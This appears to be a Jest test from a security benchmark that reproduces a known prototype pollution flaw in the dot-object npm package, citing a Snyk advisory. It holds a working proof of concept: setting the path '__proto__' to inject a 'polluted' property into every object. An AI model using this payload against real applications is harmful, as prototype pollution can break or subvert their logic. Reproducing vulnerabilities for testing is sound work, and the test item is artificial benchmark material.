//https://snyk.io/vuln/SNYK-JS-DOTOBJECT-548905
test("prototype pollution in dot-object ", () => {
  var a = require("dot-object");
  var obj = {};
  var path = process.env.SECBENCH_PAYLOAD || "__proto__";

  expect({}.polluted).toBe(undefined);

  var val = { polluted: "yes" };
  a.set(path, val, {}, true);
  expect({}.polluted).toBe("yes");
});
